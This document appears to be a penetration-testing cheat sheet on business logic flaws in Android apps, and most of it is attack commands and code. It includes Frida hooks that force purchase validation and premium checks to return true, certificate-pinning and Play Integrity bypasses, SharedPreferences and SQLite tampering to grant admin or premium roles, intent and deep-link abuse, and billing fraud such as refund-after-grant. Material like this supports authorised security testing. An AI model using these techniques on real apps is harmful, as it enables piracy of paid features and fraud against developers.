# Android BLF — APK-Specific Business Logic Flaws

## Setup Checklist
```bash
# 1. Decompile
apktool d target.apk -o decompiled/
jadx-gui target.apk

# 2. Extract endpoints & secrets
grep -rE "(https?://[^\s\"'<>]+)" decompiled/ | sort -u
grep -rE "(api_key|secret|token|password|private)" decompiled/ --include="*.xml" --include="*.smali"

# 3. Proxy setup (intercept API calls)
# Install Burp cert on device, set proxy, or use:
adb shell settings put global http_proxy 192.168.x.x:8080

# 4. Bypass cert pinning
objection -g com.target.app explore
objection > android sslpinning disable

# OR Frida:
frida -U -f com.target.app -l ssl-pinning-bypass.js
```

## In-App Purchase Logic Flaws

### Receipt Validation Vulnerabilities
```
TARGET: StoreKit receipt / Google Play purchase token

SERVER-SIDE VALIDATION (correct):
  App → purchase → receipt → server validates with Apple/Google → grants feature

CLIENT-SIDE VALIDATION (vulnerable):
  App → purchase → local check → grants feature
  ATTACK: Modify return value of validation method via Frida

FRIDA HOOK (receipt validation bypass):
```
```javascript
// Hook Java method that validates purchase
Java.perform(function() {
    var PurchaseValidator = Java.use('com.target.app.billing.PurchaseValidator');
    PurchaseValidator.validatePurchase.overload('java.lang.String').implementation = function(receiptData) {
        console.log('[BLF] validatePurchase called, forcing TRUE');
        return true;
    };
    
    // Also hook isPremiumUser / hasSubscription
    var UserManager = Java.use('com.target.app.user.UserManager');
    UserManager.isPremiumUser.implementation = function() {
        return true;
    };
});
```

### Google Play Billing Abuse
```
□ Purchase token reuse: same purchase_token sent twice before server invalidates
□ Subscription state: app reads subscription status from SharedPreferences → tamper
□ Test purchase: use test card → app treats as real → grants feature
□ Refund after grant: purchase → receive premium → issue refund → keep premium
□ Product ID swap: intercept billing API call → change product_id to free tier
□ Acknowledgement race: purchase → race on acknowledge → double grant
```

## Client-Side Business Logic (Android)

### Smali / Java Logic Bypass
```java
// PATTERN 1: Client-side role check (find in jadx)
if (user.isPremium()) {
    showFeatureX();
} else {
    showUpgradePrompt();
}
// ATTACK: Hook isPremium() → return true

// PATTERN 2: Feature flag in SharedPreferences
SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
boolean isAdmin = prefs.getBoolean("is_admin", false);
// ATTACK: adb shell → modify shared prefs XML directly

// PATTERN 3: Hardcoded role check
if (user.role.equals("premium") || BuildConfig.DEBUG) {
    // ATTACK: Use debug build flag or modify user.role via Frida

// PATTERN 4: License check
LicenseChecker checker = new LicenseChecker(...);
checker.checkAccess(new MyLicenseCheckerCallback());
// ATTACK: Hook checkAccess callback → always return LICENSED
```

### SharedPreferences & Local Storage Tampering
```bash
# Root device or use Android backup
adb backup -noapk com.target.app
# Extract and modify:
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/prefs.xml

# Modify is_premium, role, expiry_date, feature_flags
# Re-push modified file
adb shell run-as com.target.app cp /sdcard/modified_prefs.xml \
  /data/data/com.target.app/shared_prefs/prefs.xml
```

### SQLite Database Manipulation
```bash
# Access app's SQLite DB (rooted)
adb shell
sqlite3 /data/data/com.target.app/databases/app.db

# Queries to try:
.tables
SELECT * FROM users;
UPDATE users SET role='admin', plan='premium' WHERE id=YOUR_ID;
SELECT * FROM purchases;
# Check if server validates on next API call or trusts local DB
```

## Android Deep Link & Intent BLF

```
□ Deep link to premium features without auth:
  adb shell am start -a android.intent.action.VIEW \
    -d "targetapp://premium/feature?token=ANYTHING"

□ Exported activities: find in AndroidManifest.xml
  <activity android:name=".AdminActivity" android:exported="true">
  → start directly: adb shell am start -n com.target/.AdminActivity

□ Intent with extras:
  adb shell am start -n com.target/.PurchaseConfirmActivity \
    --ez is_purchased true --es plan premium

□ Broadcast receiver manipulation:
  adb shell am broadcast -a com.target.PURCHASE_COMPLETE \
    --es product_id "premium_annual"

□ Content provider IDOR:
  adb shell content query --uri content://com.target.provider/users/1
  adb shell content query --uri content://com.target.provider/users/2
```

## API Business Logic via Android App

```
□ Intercept all API calls via Burp/mitmproxy after pin bypass
□ Find endpoints that mobile app exposes but web app hides
□ Device attestation bypass: SafetyNet/Play Integrity API
  → Frida: hook attestation response → return BASIC/CTS_PROFILE_MATCH=true
□ App-specific auth headers: X-App-Version, X-Device-ID → manipulate
□ Debug endpoints: /api/debug/, /api/test/ accessible in prod
□ Certificate mismatch: old API version still accepts app cert
```

## Key BLF Test Cases for Android

| Vulnerability | How to Find | How to Test |
|--------------|-------------|-------------|
| IAP bypass | jadx → billing class | Frida hook validation method |
| Client-side premium check | jadx → `isPremium()` | Frida → return true |
| SharedPrefs role | Search `is_admin` in prefs | adb shell run-as → modify |
| Exported activity | AndroidManifest.xml | adb am start directly |
| SQLite manipulation | DB file in /data/data/ | sqlite3 UPDATE |
| Deep link auth bypass | Deep link patterns in manifest | adb am start -d link |
| Debug API endpoint | Grep API URLs in decompiled | Direct HTTP request |
| Race condition on purchase | API endpoint from intercept | Turbo Intruder / asyncio |
